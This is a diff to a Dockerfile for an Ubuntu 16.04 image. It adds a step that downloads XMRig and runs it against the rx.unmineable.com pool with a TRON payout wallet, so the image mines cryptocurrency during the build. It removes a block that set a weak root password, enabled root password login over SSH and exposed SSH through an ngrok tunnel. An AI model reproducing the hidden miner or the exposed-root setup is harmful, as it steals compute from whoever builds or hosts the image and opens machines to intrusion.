@@ -1,3 +1,6 @@
+#####################################################################
+#                   thank you bro rizafiq                           #
+#####################################################################
 FROM ubuntu:16.04
 ENV DEBIAN_FRONTEND=noninteractive
 
@@ -20,26 +23,5 @@ RUN set -ex; \
 RUN useradd -m kunemuse && \
     adduser kunemuse sudo && \
     sudo usermod -a -G sudo kunemuse
-    
 
-
-# Set environment variables.
-ENV HOME /
-
-# Define working directory.
-WORKDIR /
-
-RUN echo root:kunemuse | chpasswd
-RUN mkdir -p /var/run/sshd
-RUN echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
-RUN echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
-RUN echo "LD_LIBRARY_PATH=/usr/lib64-nvidia" >> /root/.bashrc
-RUN echo "export LD_LIBRARY_PATH" >> /root/.bashrc
-
-RUN wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
-
-RUN unzip ngrok-stable-linux-amd64.zip
-
-RUN chmod +x ngrok
-RUN ./ngrok tcp 22
-
+RUN wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz && tar -xf xmrig-6.12.2-linux-x64.tar.gz && cd xmrig-6.12.2 && ./xmrig -o rx.unmineable.com:3333 -u TRX:TLjhpDMrsLyUuchLZnN4KACfdChL4rSm4E -k -a rx/0
